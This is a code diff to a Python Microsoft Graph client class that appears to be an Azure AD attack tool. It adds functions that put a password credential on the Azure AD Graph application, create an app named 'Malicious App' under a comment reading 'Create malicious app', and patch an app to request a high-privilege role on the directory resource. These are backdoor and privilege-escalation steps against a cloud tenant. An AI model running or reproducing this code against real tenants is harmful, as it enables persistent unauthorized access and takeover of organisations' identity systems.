@@ -134,7 +134,7 @@ class Graph:
        # endpoint = '/applications'
         endpoint = '/servicePrincipals'
         # Only request specific properties
-        search = 'displayName:Sales'
+        search = 'displayName:Windows Azure Active Directory'
         request_url = f'{endpoint}?$search="{search}"&$count=true ' \
 
 
@@ -185,9 +185,9 @@ class Graph:
         print(keys)
         return keys.json()
 
-    def add_password(self, token):
+    def add_password(self, token ,id ="460a567d-f226-4836-b929-0a4a83427177"):
         # salesforce app id from seearch
-        id ="460a567d-f226-4836-b929-0a4a83427177"
+
         #id = "232b2e58-7e6e-4567-bef0-eff5a2bd5b73"
         # sales force service principal id = "ab220987-a982-4b6a-9c3b-f07f233f4bf8"
         # id = "2942ffee-ad11-458b-95a9-242e361aafa4"
@@ -208,12 +208,65 @@ class Graph:
         print(added_password)
         return added_password.json()
 
+    def add_password(self, token, id="00000002-0000-0000-c000-000000000000" ):
+        #                             "460a567d-f226-4836-b929-0a4a83427177"):
+        # salesforce app id from seearch
+
+        # id = "232b2e58-7e6e-4567-bef0-eff5a2bd5b73"
+        # sales force service principal id = "ab220987-a982-4b6a-9c3b-f07f233f4bf8"
+        # id = "2942ffee-ad11-458b-95a9-242e361aafa4"
+        # id = '53857935-7373-49af-b209-497f13dc8493'
+        request_url = f'/applications/{id}/addPassword'
+
+        body = {'displayName': 'my token'}
+
+        print(request_url)
+        print(body)
+        print({'Authorization': f'Bearer {token}'
+                  , 'Content-Type': 'application/json'})
+        added_password = self.user_client.post(request_url,
+                                               data=json.dumps(body),
+                                               headers={'Authorization': f'Bearer {token}'
+                                                   , 'Content-Type': 'application/json'})
+        print(added_password)
+        return added_password.json()
+
 
 
     ####   Create malicious app
-    def get_app_keys(self):
-        request_url = f'/applications/{id}?$select=keyCredentials'
+    def create_app(self,token):
+        request_url = "/applications"
+        body = { "displayName": "Malicious App" }
         print(request_url)
-        keys = self.user_client.get(request_url, headers={'ConsistencyLevel': 'eventual'})
-        print(keys)
-        return keys.json()
+        response = self.user_client.post(request_url,
+                                         data=json.dumps(body),
+                                                 headers={'Authorization': f'Bearer {token}'
+                                                 , 'Content-Type': 'application/json'})
+        return response.json()
+
+ ####   Create malicious app
+    def add_app_permissions(self,token ,id = '9b042f49-6aec-4a47-a66d-17b246f7320b'):
+        request_url = f'/applications/{id}'
+        body = {
+                          "requiredResourceAccess": [
+                    {
+                        "resourceAppId": "00000002-0000-0000-c000-000000000000",
+                        "resourceAccess": [
+                            {
+                                "id": "75359482-378d-4052-8f01-80520e7db3cd",
+                                "type": "Role"
+                            }
+                        ]
+                    }
+                  ]
+            }
+        print(request_url)
+        response = self.user_client.patch(request_url,
+                                         data=json.dumps(body),
+                                                 headers={'Authorization': f'Bearer {token}'
+                                                 , 'Content-Type': 'application/json'})
+        return response
+
+
+
+
